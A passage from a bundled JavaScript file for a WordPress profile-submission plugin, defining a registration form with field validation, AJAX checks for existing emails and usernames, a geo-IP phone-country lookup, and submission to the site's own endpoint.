            email: "",
            username: "",
            password: "",
            phone: "",
            birthDate: "",
            address: {
                street: "",
                unit: "",
                city: "",
                state: "",
                zipCode: "",
                country: ""
            },
            interests: [],
            cv: ""
        },
        errors: {},
        countries: window.countries || [],
        translations: window.formTranslations,
        dateFormat: window.formTranslations.placeholders.dateFormat,
        config: window.formConfig,
        loading: false,
        init () {
            const input = document.querySelector("#phone");
            if (input) (0, _intlTelInputDefault.default)(input, {
                initialCountry: "auto",
                containerClass: "iti w-full",
                geoIpLookup: (callback)=>{
                    fetch("https://ipapi.co/json").then((res)=>res.json()).then((data)=>{
                        callback(data.country_code);
                        this.formData.address.country = data.country;
                    }).catch(()=>{
                        callback("us");
                        this.formData.address.country = "US";
                    });
                },
                loadUtilsOnInit: ()=>require("a22db7ce9cf196c6")
            });
            fetch("/wp-content/plugins/profile-submit-pro/assets/countries.json", {
                headers: {
                    "Content-Type": "application/json"
                }
            }).then((res)=>res.json()).then((data)=>{
                this.countries = data;
            }).catch((error)=>{
                console.error("Error loading countries:", error);
                this.countries = [];
            });
        },
        validateName () {
            this.errors.name = this.formData.name.length < 3 ? this.translations.errors.name : "";
        },
        validateEmail () {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            this.errors.email = !emailRegex.test(this.formData.email) ? this.translations.errors.email : "";
        },
        async validateEmailExists () {
            const data = {
                action: "verify_email_exists",
                security: this.config.security,
                email: this.formData.email
            };
            try {
                const response = await fetch(this.config.ajax_url, {
                    method: "POST",
                    body: new URLSearchParams(data)
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                const responseData = await response.json();
                if (responseData.data.exists) {
                    this.errors.email = this.translations.errors.emailExists;
                    return false;
                }
                return true;
            } catch (error) {
                console.error("Error verifying email exists:", error);
                this.errors.email = "Error verifying email exists";
                return false;
            }
        },
        validateUsername () {
            this.errors.username = this.formData.username.length < 3 ? this.translations.errors.username : "";
        },
        async validateUsernameExists () {
            const data = {
                action: "verify_username_exists",
                security: this.config.security,
                username: this.formData.username
            };
            try {
                const response = await fetch(this.config.ajax_url, {
                    method: "POST",
                    body: new URLSearchParams(data)
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                const responseData = await response.json();
                if (responseData.data.exists) {
                    this.errors.username = this.translations.errors.usernameExists;
                    return false;
                }
                return true;
            } catch (error) {
                console.error("Error verifying username exists:", error);
                this.errors.username = "Error verifying username exists";
            }
        },
        validatePassword () {
            // Password must have at least 8 characters, including letters and numbers
            const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
            this.errors.password = !passwordRegex.test(this.formData.password) ? this.translations.errors.password : "";
        },
        validatePhone () {
            // Clean the phone number by removing spaces and dashes
            const cleanPhone = this.formData.phone.replace(/[\s-]/g, "");
            // Regex for Brazilian phone numbers:
            // - 2 digits for area code (11-99)
            // - 8-9 digits for phone number
            const phoneRegex = /^([1-9]{2})(9?\d{8})$/;
            this.errors.phone = !phoneRegex.test(cleanPhone) ? this.translations.errors.phone : "";
        },
        validateAddress () {
            this.errors.address = {};
            this.errors.address.street = this.formData.address.street ? "" : this.translations.errors.address.street;
            this.errors.address.unit = this.formData.address.unit ? "" : this.translations.errors.address.unit;
            this.errors.address.city = this.formData.address.city ? "" : this.translations.errors.address.city;
            this.errors.address.state = this.formData.address.state ? "" : this.translations.errors.address.state;
            this.errors.address.zipCode = this.formData.address.zipCode ? "" : this.translations.errors.address.zipCode;
            this.errors.address.country = this.formData.address.country ? "" : this.translations.errors.address.country;
        },
        validateInterests () {
            this.errors.interests = this.formData.interests.length < 3 ? this.translations.errors.interests : "";
        },
        validateCv () {
            this.errors.cv = this.formData.cv.length < 20 ? this.translations.errors.cv : "";
        },
        formatAndValidateBirthdate () {
            this.formData.birthDate = this.formData.birthDate.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
            this.validateBirthdate();
        },
        validateBirthdate () {
            if (!this.formData.birthDate) {
                this.errors.birthDate = this.translations.errors.birthDate;
                return;
            }
            const parsedDate = new Date(this.formData.birthDate);
            if (isNaN(parsedDate.getTime())) this.errors.birthDate = this.translations.errors.birthDate;
            else this.errors.birthDate = "";
        },
        async validateForm () {
            // Run all validations first
            this.validateName();
            this.validateEmail();
            this.validateUsername();
            this.validatePassword();
            this.validatePhone();
            this.validateBirthdate();
            this.validateAddress();
            this.validateInterests();
            this.validateCv();
            await this.validateEmailExists();
            await this.validateUsernameExists();
            const valid = Object.values(this.errors).every((error)=>error === "" || (0, _utils.isErrorObjectEmpty)(error));
            if (!valid) {
                (0, _sweetalert2Default.default).fire({
                    icon: "error",
                    title: "Oops...",
                    text: this.translations.errors.formError
                });
                return false;
            }
            this.loading = true;
            try {
                const data = {
                    action: this.config.action,
                    security: this.config.security,
                    post_data: JSON.stringify(this.formData)
                };
                const response = await fetch(this.config.ajax_url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: new URLSearchParams(data)
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                this.formData = {};
                (0, _sweetalert2Default.default).fire({
                    icon: "success",
                    title: "Success!",
                    text: this.translations.errors.formSuccess,
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    didClose: ()=>{
                        window.location.href = this.config.redirect_url;
                    }
                });
            } catch (error) {
                console.error("There was a problem with your fetch operation:", error);
                (0, _sweetalert2Default.default).fire({
                    icon: "error",
                    title: "Oops...",
                    text: "There was a problem in the server. Please try again later."
                });
                return false;
            }
            this.loading = false;
            return true;
        }
    };
}

},{"sweetalert2":"1HyFr","intl-tel-input":"lXOeg","../utils":"hFIk5","a22db7ce9cf196c6":"29ysN","@parcel/transformer-js/src/esmodule-helpers.js":"dIQaP"}]},["8gSz4","fyuRC"], "fyuRC", "parcelRequire4480")

//# sourceMappingURL=profile-submit-pro_public.js.map
